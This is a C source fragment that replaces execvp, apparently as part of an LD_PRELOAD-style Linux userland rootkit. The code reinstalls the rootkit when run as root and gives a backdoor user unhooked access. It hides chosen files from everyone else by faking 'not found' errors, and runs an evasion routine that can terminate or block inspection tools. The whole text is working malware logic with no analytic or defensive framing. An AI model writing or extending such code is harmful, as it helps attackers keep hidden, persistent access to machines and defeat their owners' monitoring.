int execvp(const char *filename, char *const argv[])
{
    #ifdef DO_REINSTALL
    if(!not_user(0)) reinstall();
    #endif
    hook(CEXECVP);

    if(is_bdusr()) return (long)call(CEXECVP, filename, argv);
    if(hidden_path(filename)){
        errno = ENOENT;
        return -1;
    }

    #if defined(HIDE_SELF) && defined(DO_REINSTALL)
    int evasion_status = evade(filename, argv, NULL);
    switch(evasion_status)
    {
        case VEVADE_DONE:
            exit(0);
        case VINVALID_PERM:
            errno = EPERM;
            return -1;
        case VFORK_ERR:
            return -1;
        case VFORK_SUC:
            return (long)call(CEXECVP, filename, argv);
        case VNOTHING_DONE:
            break;  /* ?? */
    }
    #endif
    
    return (long)call(CEXECVP, filename, argv);
}
